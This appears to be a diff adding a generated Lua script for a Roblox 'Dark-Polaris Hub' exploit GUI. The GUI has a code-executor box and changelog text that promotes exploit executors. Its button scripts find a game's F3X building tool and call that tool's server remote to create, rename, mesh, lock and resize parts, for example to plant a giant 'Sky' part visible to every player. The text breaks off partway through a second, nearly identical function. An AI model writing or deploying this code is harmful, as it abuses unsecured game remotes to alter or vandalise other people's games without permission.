@@ -1,0 +1,971 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+
+designed using localmaze gui creator
+]=]
+
+-- Instances: 34 | Scripts: 7 | Modules: 0 | Tags: 0
+local LMG2L = {};
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ClipToDeviceSafeArea"] = false;
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+LMG2L["ScreenGui_1"]["ResetOnSpawn"] = false;
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.TextButton
+LMG2L["TextButton_2"] = Instance.new("TextButton", LMG2L["ScreenGui_1"]);
+LMG2L["TextButton_2"]["TextWrapped"] = true;
+LMG2L["TextButton_2"]["BorderSizePixel"] = 0;
+LMG2L["TextButton_2"]["TextSize"] = 20;
+LMG2L["TextButton_2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_2"]["BackgroundColor3"] = Color3.fromRGB(22, 22, 22);
+LMG2L["TextButton_2"]["Size"] = UDim2.new(0, 138, 0, 42);
+LMG2L["TextButton_2"]["Text"] = [[Open]];
+LMG2L["TextButton_2"]["Position"] = UDim2.new(0, 338, 0, -44);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.TextButton.UICorner
+LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["TextButton_2"]);
+LMG2L["UICorner_3"]["CornerRadius"] = UDim.new(0, 20);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.TextButton.LocalScript
+LMG2L["LocalScript_4"] = Instance.new("LocalScript", LMG2L["TextButton_2"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame
+LMG2L["Frame_5"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["Frame_5"]["BorderSizePixel"] = 3;
+LMG2L["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Frame_5"]["Size"] = UDim2.new(0, 834, 0, 480);
+LMG2L["Frame_5"]["Position"] = UDim2.new(0, 14, 0, 8);
+LMG2L["Frame_5"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Frame_5"]["BackgroundTransparency"] = 0.2;
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextLabel
+LMG2L["TextLabel_6"] = Instance.new("TextLabel", LMG2L["Frame_5"]);
+LMG2L["TextLabel_6"]["TextWrapped"] = true;
+LMG2L["TextLabel_6"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_6"]["TextScaled"] = true;
+LMG2L["TextLabel_6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_6"]["Size"] = UDim2.new(0, 830, 0, 22);
+LMG2L["TextLabel_6"]["Text"] = [[Dark-Polaris Hub]];
+LMG2L["TextLabel_6"]["Position"] = UDim2.new(0, 2, 0, 4);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextBox
+LMG2L["TextBox_7"] = Instance.new("TextBox", LMG2L["Frame_5"]);
+LMG2L["TextBox_7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextBox_7"]["BorderSizePixel"] = 3;
+LMG2L["TextBox_7"]["TextWrapped"] = true;
+LMG2L["TextBox_7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_7"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["TextBox_7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextBox_7"]["MultiLine"] = true;
+LMG2L["TextBox_7"]["ClearTextOnFocus"] = false;
+LMG2L["TextBox_7"]["PlaceholderText"] = [[No Bio]];
+LMG2L["TextBox_7"]["Size"] = UDim2.new(0, 422, 0, 228);
+LMG2L["TextBox_7"]["Position"] = UDim2.new(0, 400, 0, 54);
+LMG2L["TextBox_7"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_7"]["Text"] = [[-- No Bio]];
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextLabel
+LMG2L["TextLabel_8"] = Instance.new("TextLabel", LMG2L["Frame_5"]);
+LMG2L["TextLabel_8"]["TextWrapped"] = true;
+LMG2L["TextLabel_8"]["BorderSizePixel"] = 3;
+LMG2L["TextLabel_8"]["TextScaled"] = true;
+LMG2L["TextLabel_8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_8"]["Size"] = UDim2.new(0, 166, 0, 16);
+LMG2L["TextLabel_8"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_8"]["Text"] = [[Executor]];
+LMG2L["TextLabel_8"]["Position"] = UDim2.new(0, 400, 0, 30);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextLabel
+LMG2L["TextLabel_9"] = Instance.new("TextLabel", LMG2L["Frame_5"]);
+LMG2L["TextLabel_9"]["TextWrapped"] = true;
+LMG2L["TextLabel_9"]["BorderSizePixel"] = 3;
+LMG2L["TextLabel_9"]["TextScaled"] = true;
+LMG2L["TextLabel_9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_9"]["Size"] = UDim2.new(0, 138, 0, 16);
+LMG2L["TextLabel_9"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_9"]["Text"] = [[Script F3X]];
+LMG2L["TextLabel_9"]["Position"] = UDim2.new(0, 6, 0, 32);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.UIDragDetector
+LMG2L["UIDragDetector_a"] = Instance.new("UIDragDetector", LMG2L["Frame_5"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame
+LMG2L["Frame_b"] = Instance.new("Frame", LMG2L["Frame_5"]);
+LMG2L["Frame_b"]["BorderSizePixel"] = 3;
+LMG2L["Frame_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Frame_b"]["Size"] = UDim2.new(0, 384, 0, 222);
+LMG2L["Frame_b"]["Position"] = UDim2.new(0, 6, 0, 56);
+LMG2L["Frame_b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton
+LMG2L["TextButton_c"] = Instance.new("TextButton", LMG2L["Frame_b"]);
+LMG2L["TextButton_c"]["TextWrapped"] = true;
+LMG2L["TextButton_c"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_c"]["TextScaled"] = true;
+LMG2L["TextButton_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextButton_c"]["Size"] = UDim2.new(0, 124, 0, 40);
+LMG2L["TextButton_c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_c"]["Text"] = [[Skybox]];
+LMG2L["TextButton_c"]["Position"] = UDim2.new(0, 6, 0, 6);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+LMG2L["LocalScript_d"] = Instance.new("LocalScript", LMG2L["TextButton_c"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton
+LMG2L["TextButton_e"] = Instance.new("TextButton", LMG2L["Frame_b"]);
+LMG2L["TextButton_e"]["TextWrapped"] = true;
+LMG2L["TextButton_e"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_e"]["TextScaled"] = true;
+LMG2L["TextButton_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextButton_e"]["Size"] = UDim2.new(0, 124, 0, 40);
+LMG2L["TextButton_e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_e"]["Text"] = [[Decal]];
+LMG2L["TextButton_e"]["Position"] = UDim2.new(0, 6, 0, 54);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+LMG2L["LocalScript_f"] = Instance.new("LocalScript", LMG2L["TextButton_e"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton
+LMG2L["TextButton_10"] = Instance.new("TextButton", LMG2L["Frame_b"]);
+LMG2L["TextButton_10"]["TextWrapped"] = true;
+LMG2L["TextButton_10"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_10"]["TextScaled"] = true;
+LMG2L["TextButton_10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextButton_10"]["Size"] = UDim2.new(0, 124, 0, 40);
+LMG2L["TextButton_10"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_10"]["Text"] = [[Realm]];
+LMG2L["TextButton_10"]["Position"] = UDim2.new(0, 138, 0, 6);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+LMG2L["LocalScript_11"] = Instance.new("LocalScript", LMG2L["TextButton_10"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton
+LMG2L["TextButton_12"] = Instance.new("TextButton", LMG2L["Frame_b"]);
+LMG2L["TextButton_12"]["TextWrapped"] = true;
+LMG2L["TextButton_12"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_12"]["TextScaled"] = true;
+LMG2L["TextButton_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextButton_12"]["Size"] = UDim2.new(0, 124, 0, 40);
+LMG2L["TextButton_12"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_12"]["Text"] = [[R0van Gui F3X V3]];
+LMG2L["TextButton_12"]["Position"] = UDim2.new(0, 138, 0, 54);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+LMG2L["LocalScript_13"] = Instance.new("LocalScript", LMG2L["TextButton_12"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextButton
+LMG2L["TextButton_14"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["TextButton_14"]["TextWrapped"] = true;
+LMG2L["TextButton_14"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_14"]["TextScaled"] = true;
+LMG2L["TextButton_14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextButton_14"]["Size"] = UDim2.new(0, 124, 0, 40);
+LMG2L["TextButton_14"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_14"]["Text"] = [[Execute]];
+LMG2L["TextButton_14"]["Position"] = UDim2.new(0, 400, 0, 292);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextButton.LocalScript
+LMG2L["LocalScript_15"] = Instance.new("LocalScript", LMG2L["TextButton_14"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextButton
+LMG2L["TextButton_16"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["TextButton_16"]["TextWrapped"] = true;
+LMG2L["TextButton_16"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_16"]["TextScaled"] = true;
+LMG2L["TextButton_16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_16"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextButton_16"]["Size"] = UDim2.new(0, 124, 0, 40);
+LMG2L["TextButton_16"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_16"]["Text"] = [[Clear]];
+LMG2L["TextButton_16"]["Position"] = UDim2.new(0, 534, 0, 292);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextButton.LocalScript
+LMG2L["LocalScript_17"] = Instance.new("LocalScript", LMG2L["TextButton_16"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame
+LMG2L["ScrollingFrame_18"] = Instance.new("ScrollingFrame", LMG2L["Frame_5"]);
+LMG2L["ScrollingFrame_18"]["BorderSizePixel"] = 3;
+LMG2L["ScrollingFrame_18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["ScrollingFrame_18"]["Size"] = UDim2.new(0, 386, 0, 184);
+LMG2L["ScrollingFrame_18"]["Position"] = UDim2.new(0, 6, 0, 290);
+LMG2L["ScrollingFrame_18"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel
+LMG2L["TextLabel_19"] = Instance.new("TextLabel", LMG2L["ScrollingFrame_18"]);
+LMG2L["TextLabel_19"]["TextWrapped"] = true;
+LMG2L["TextLabel_19"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_19"]["TextScaled"] = true;
+LMG2L["TextLabel_19"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_19"]["BackgroundTransparency"] = 1;
+LMG2L["TextLabel_19"]["Size"] = UDim2.new(0, 366, 0, 24);
+LMG2L["TextLabel_19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_19"]["Text"] = [[Changelogs ðŸ”¥]];
+LMG2L["TextLabel_19"]["Position"] = UDim2.new(0, 4, 0, 4);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel
+LMG2L["TextLabel_1a"] = Instance.new("TextLabel", LMG2L["ScrollingFrame_18"]);
+LMG2L["TextLabel_1a"]["TextWrapped"] = true;
+LMG2L["TextLabel_1a"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_1a"]["TextScaled"] = true;
+LMG2L["TextLabel_1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_1a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_1a"]["Size"] = UDim2.new(0, 366, 0, 70);
+LMG2L["TextLabel_1a"]["Text"] = [[Introducing Dark-Polaris, Born of Polaria, Well We Have Launched Our GUI Namely Dark-Polaris, After Losing Dark-Polaris V1, We Discontinued Dark-Polaris V1 And We Made An Advanced Version.]];
+LMG2L["TextLabel_1a"]["Position"] = UDim2.new(0, 4, 0, 36);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel.UIGradient
+LMG2L["UIGradient_1b"] = Instance.new("UIGradient", LMG2L["TextLabel_1a"]);
+LMG2L["UIGradient_1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 108, 30)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 228, 26))};
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel
+LMG2L["TextLabel_1c"] = Instance.new("TextLabel", LMG2L["ScrollingFrame_18"]);
+LMG2L["TextLabel_1c"]["TextWrapped"] = true;
+LMG2L["TextLabel_1c"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_1c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_1c"]["TextScaled"] = true;
+LMG2L["TextLabel_1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_1c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_1c"]["Size"] = UDim2.new(0, 366, 0, 70);
+LMG2L["TextLabel_1c"]["Text"] = [[ðŸŽ Introducing Dark-Polaris Exploit Executor.                  We have received new executors, namely Arceus X, Delta, Krnl, Fluxus, Xeno, Wave, and all executors we received at Scriptblox. We do not accept with Skid]];
+LMG2L["TextLabel_1c"]["Position"] = UDim2.new(0, 4, 0, 110);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel.UIGradient
+LMG2L["UIGradient_1d"] = Instance.new("UIGradient", LMG2L["TextLabel_1c"]);
+LMG2L["UIGradient_1d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(38, 179, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(27, 21, 255))};
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel
+LMG2L["TextLabel_1e"] = Instance.new("TextLabel", LMG2L["ScrollingFrame_18"]);
+LMG2L["TextLabel_1e"]["TextWrapped"] = true;
+LMG2L["TextLabel_1e"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_1e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_1e"]["TextScaled"] = true;
+LMG2L["TextLabel_1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_1e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextLabel_1e"]["Size"] = UDim2.new(0, 366, 0, 70);
+LMG2L["TextLabel_1e"]["Text"] = [[ðŸ”’Security is Important! We Don't Accept About Serverside/FE Bypass Because It's Very Illegal For Exploiters We Have Prepared F3X Script Not Serverside/FE Bypass Use Executor That What We Provide Use For Lua Code Or Some Kind Of Exploit Thank You For Reading]];
+LMG2L["TextLabel_1e"]["Position"] = UDim2.new(0, 4, 0, 184);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.ScrollingFrame.TextLabel.UIGradient
+LMG2L["UIGradient_1f"] = Instance.new("UIGradient", LMG2L["TextLabel_1e"]);
+LMG2L["UIGradient_1f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(27, 255, 38)),ColorSequenceKeypoint.new(0.727, Color3.fromRGB(4, 105, 13)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(4, 105, 13))};
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextLabel
+LMG2L["TextLabel_20"] = Instance.new("TextLabel", LMG2L["Frame_5"]);
+LMG2L["TextLabel_20"]["TextWrapped"] = true;
+LMG2L["TextLabel_20"]["BorderSizePixel"] = 3;
+LMG2L["TextLabel_20"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_20"]["TextScaled"] = true;
+LMG2L["TextLabel_20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_20"]["Size"] = UDim2.new(0, 366, 0, 70);
+LMG2L["TextLabel_20"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_20"]["Text"] = [[Follow My Account Tiktok : Priamedandariind            Dev : arfanugraha004                                     Scripter : Cr0x_00LSOS]];
+LMG2L["TextLabel_20"]["Position"] = UDim2.new(0, 402, 0, 346);
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextLabel.UIGradient
+LMG2L["UIGradient_21"] = Instance.new("UIGradient", LMG2L["TextLabel_20"]);
+LMG2L["UIGradient_21"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(92, 92, 92)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextLabel.UIStroke
+LMG2L["UIStroke_22"] = Instance.new("UIStroke", LMG2L["TextLabel_20"]);
+
+
+
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.TextButton.LocalScript
+local function C_4()
+	local script = LMG2L["LocalScript_4"];
+	Button = script.Parent.Parent    	
+	    Frame = script.Parent    	
+	    Button.MouseButton1Click:Connect(function()    	
+	    if Frame. Visible then    	
+	    Frame. Visible = false    	
+	    else    	
+	    Frame. Visible = true    	
+	    end    	
+	    end)	
+end;
+task.spawn(C_4);
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+local function C_d()
+	local script = LMG2L["LocalScript_d"];
+	local button = script.Parent    	
+	    button.MouseButton1Click:Connect(function()    	
+	local player = game.Players.LocalPlayer	
+	local char = player.Character	
+	local tool	
+	
+	for i,v in player:GetDescendants() do	
+		if v.Name == "SyncAPI" then	
+			tool = v.Parent	
+		end	
+	end	
+	
+	for i,v in game.ReplicatedStorage:GetDescendants() do	
+		if v.Name == "SyncAPI" then	
+			tool = v.Parent	
+		end	
+	end	
+	
+	remote = tool.SyncAPI.ServerEndpoint	
+	function _(args)	
+		remote:InvokeServer(unpack(args))	
+	end	
+	
+	function SetCollision(part,boolean)	
+		local args = {	
+			[1] = "SyncCollision",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["CanCollide"] = boolean	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function SetAnchor(boolean,part)	
+		local args = {	
+			[1] = "SyncAnchor",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["Anchored"] = boolean	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function CreatePart(cf,parent)	
+		local args = {	
+			[1] = "CreatePart",	
+			[2] = "Normal",	
+			[3] = cf,	
+			[4] = parent	
+		}	
+		_(args)	
+	end	
+	
+	function DestroyPart(part)	
+		local args = {	
+			[1] = "Remove",	
+			[2] = {	
+				[1] = part	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function MovePart(part,cf)	
+		local args = {	
+			[1] = "SyncMove",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["CFrame"] = cf	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function Resize(part,size,cf)	
+		local args = {	
+			[1] = "SyncResize",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["CFrame"] = cf,	
+					["Size"] = size	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function AddMesh(part)	
+		local args = {	
+			[1] = "CreateMeshes",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function SetMesh(part,meshid)	
+		local args = {	
+			[1] = "SyncMesh",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["MeshId"] = "rbxassetid://"..meshid	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function SetTexture(part, texid)	
+		local args = {	
+			[1] = "SyncMesh",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["TextureId"] = "rbxassetid://"..texid	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function SetName(part, stringg)	
+		local args = {	
+			[1] = "SetName",	
+			[2] = {	
+				[1] = part	
+			},	
+			[3] = stringg	
+		}	
+		_(args)	
+	end	
+	
+	function MeshResize(part,size)	
+		local args = {	
+			[1] = "SyncMesh",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["Scale"] = size	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function Weld(part1, part2,lead)	
+		local args = {	
+			[1] = "CreateWelds",	
+			[2] = {	
+				[1] = part1,	
+				[2] = part2	
+			},	
+			[3] = lead	
+		}	
+		_(args)	
+	end	
+	
+	function SetLocked(part,boolean)	
+		local args = {	
+			[1] = "SetLocked",	
+			[2] = {	
+				[1] = part	
+			},	
+			[3] = boolean	
+		}	
+		_(args)	
+	end	
+	
+	function SetTrans(part,int)	
+		local args = {	
+			[1] = "SyncMaterial",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["Transparency"] = int	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function CreateSpotlight(part)	
+		local args = {	
+			[1] = "CreateLights",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["LightType"] = "SpotLight"	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function SyncLighting(part,brightness)	
+		local args = {	
+			[1] = "SyncLighting",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["LightType"] = "SpotLight",	
+					["Brightness"] = brightness	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function Color(part,color)	
+		local args = {	
+			[1] = "SyncColor",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["Color"] = color,	
+					["UnionColoring"] = false	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function SpawnDecal(part,side)	
+		local args = {	
+			[1] = "CreateTextures",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["Face"] = side,	
+					["TextureType"] = "Decal"	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function AddDecal(part,asset,side)	
+		local args = {	
+			[1] = "SyncTexture",	
+			[2] = {	
+				[1] = {	
+					["Part"] = part,	
+					["Face"] = side,	
+					["TextureType"] = "Decal",	
+					["Texture"] = "rbxassetid://".. asset	
+				}	
+			}	
+		}	
+		_(args)	
+	end	
+	
+	function Sky(id)	
+		local root = char:WaitForChild("HumanoidRootPart")	
+		local pos = root.CFrame + Vector3.new(0, 6, 0)	
+		CreatePart(pos, workspace)	
+		task.wait(0.2)	
+		local skyPart	
+		for _, v in workspace:GetChildren() do	
+			if v:IsA("BasePart") and (v.Position - pos.Position).magnitude < 1 then	
+				skyPart = v	
+				break	
+			end	
+		end	
+		if skyPart then	
+			SetName(skyPart, "Sky")	
+			AddMesh(skyPart)	
+			SetMesh(skyPart, "111891702759441")	
+			SetTexture(skyPart, id)	
+			MeshResize(skyPart, Vector3.new(1000, 1000, 1000))	
+			SetLocked(skyPart, true)	
+			SetAnchor(true, skyPart)	
+		end	
+	end	
+	
+	Sky("84535713264454")	
+	
+	--Please leave this credit	
+	--Script made by Yaazkidd (I copy inspiration from blue2spooky wooo)        	
+	    end)	
+end;
+task.spawn(C_d);
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+local function C_f()
+	local script = LMG2L["LocalScript_f"];
+	local button = script.Parent    	
+	    button.MouseButton1Click:Connect(function()    	
+	local player = game.Players.LocalPlayer	
+			local char = player.Character	
+			local tool	
+			for i,v in player:GetDescendants() do	
+				if v.Name == "SyncAPI" then	
+					tool = v.Parent	
+				end	
+			end	
+			for i,v in game.ReplicatedStorage:GetDescendants() do	
+				if v.Name == "SyncAPI" then	
+					tool = v.Parent	
+				end	
+			end	
+			--craaa	
+			remote = tool.SyncAPI.ServerEndpoint	
+			function _(args)	
+				remote:InvokeServer(unpack(args))	
+			end	
+			function SetCollision(part,boolean)	
+				local args = {	
+					[1] = "SyncCollision",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["CanCollide"] = boolean	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function SetAnchor(boolean,part)	
+				local args = {	
+					[1] = "SyncAnchor",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["Anchored"] = boolean	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function CreatePart(cf,parent)	
+				local args = {	
+					[1] = "CreatePart",	
+					[2] = "Normal",	
+					[3] = cf,	
+					[4] = parent	
+				}	
+				_(args)	
+			end	
+			function DestroyPart(part)	
+				local args = {	
+					[1] = "Remove",	
+					[2] = {	
+						[1] = part	
+					}	
+				}	
+				_(args)	
+			end	
+			function MovePart(part,cf)	
+				local args = {	
+					[1] = "SyncMove",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["CFrame"] = cf	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function Resize(part,size,cf)	
+				local args = {	
+					[1] = "SyncResize",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["CFrame"] = cf,	
+							["Size"] = size	
+						}	
+					}	
+				}	
+				_(args)	
